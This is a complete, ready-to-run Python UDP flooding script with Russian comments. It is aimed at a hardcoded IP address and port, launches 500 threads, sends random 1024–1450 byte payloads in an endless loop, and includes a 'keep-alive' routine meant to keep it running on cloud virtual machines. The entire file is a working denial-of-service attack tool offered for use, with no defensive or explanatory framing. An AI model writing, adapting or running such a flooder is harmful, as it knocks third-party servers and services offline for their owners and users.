import socket
import threading
import random
import os
import time

# --- ULTIMATE CLOUD-ENVIRONMENT FLOODER ---

# Настройки цели
TARGET_IP = "5.161.184.216"
TARGET_PORT = 8305
THREADS = 500 # Оптимально для облачных виртуалок

def flood():
    # Создаем UDP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Генерируем разные размеры пачек данных, чтобы имитировать реальный трафик
    # 1024 - 1450 байт (максимум для MTU без фрагментации)
    payloads = [os.urandom(random.randint(1024, 1450)) for _ in range(10)]
    
    while True:
        try:
            # Выбираем случайную пачку и бьем по цели
            sock.sendto(random.choice(payloads), (TARGET_IP, TARGET_PORT))
        except Exception:
            # Если сокет забился, пересоздаем его
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            continue

def keep_alive():
    # Скрипт "анти-сон" для облачных сервисов
    while True:
        print(f"[STATUS] Flooding {TARGET_IP}:{TARGET_PORT}... Active threads: {threading.active_count()}")
        time.sleep(30)

if __name__ == "__main__":
    print(f"--- Launching Attack on {TARGET_IP}:{TARGET_PORT} ---")
    
    # Запускаем потоки флуда
    for i in range(THREADS):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
    
    # Удерживаем процесс живым
    keep_alive()